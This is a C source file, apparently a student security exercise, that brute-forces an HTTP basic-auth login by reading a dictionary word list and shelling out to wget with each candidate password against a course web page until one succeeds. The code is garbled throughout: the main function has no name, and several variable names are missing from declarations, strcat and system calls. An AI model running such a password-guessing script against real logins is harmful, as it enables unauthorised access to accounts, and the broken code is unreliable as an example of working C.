#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>

char *bruteforce(int *attempts);


int (void){

   int i, counter;
   int Timetaken;
   int initTime = 0, exitTime = 0;
   initTime = time();
   bruteforce(&counter);
   exitTime = time();
   Timetaken = exitTime - initTime;
   printf("\nTime taken is %lld millisecond\n", (Timetaken)/());
   printf("\nNumber of attempts  is... %d", counter);
   return 0;
}


char *bruteforce(int *attempts){     
  
   FILE *fp;
   char ch[100];
	*attempts=0;

   fp = fopen("/usr/share/lib/dict/words", "r");
   if (fp == NULL) {
      printf("file  not  open");
   }
   while (fgets(ch, 100, fp) != NULL){
	
		(*attempts)++;

      int  j = 0;
      while (j <= 100){

         if (ch[j] == '\n') {
            ch[j] = '\0';
            break;
         }
         j = j + 1;
       }
		 
       char  [100] = "wget  --http-user= --http-passwd=";
       strcat(, ch);
       strcat(, " http://sec-crack.cs.rmit.edu./SEC/2/index.php");
       printf("%s\n", );
       if (system() == 0){
          printf("Password cracked successfully: ");
          printf("Password is %s", ch);
          return NULL;
       }
   }
  
   fclose(fp);
}
